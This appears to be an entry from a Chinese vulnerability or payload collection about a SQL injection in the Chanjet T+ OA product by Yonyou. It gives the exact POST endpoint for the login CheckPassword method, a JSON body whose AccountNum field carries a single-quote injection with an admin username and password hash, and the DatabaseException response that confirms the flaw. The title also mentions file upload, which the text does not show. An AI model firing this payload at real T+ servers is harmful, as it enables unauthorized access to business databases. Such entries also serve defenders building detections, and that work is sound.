# 畅捷通OAsql注入文件上传

用友 ｜ SQL注入 ｜ —
- **请求**：`POST /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword HTTP/1.1`

**Payload**
```
"AccountNum":"1'",
"UserName":"admin",
"Password":"e10adc3949ba59abbe56e057f20f883e",
"rdpYear":"2022",
"rdpMonth":"2",
"rdpDate":"21",
"webServiceProcessID":"admin",
"ali_csessionid":"",
"ali_sig":"",
"ali_token":"",
"ali_scene":"",
"role":"",
"aqdKey":"",
"formWhere":"browser",
"cardNo":""
```
- **响应特征**：-1 DatabaseException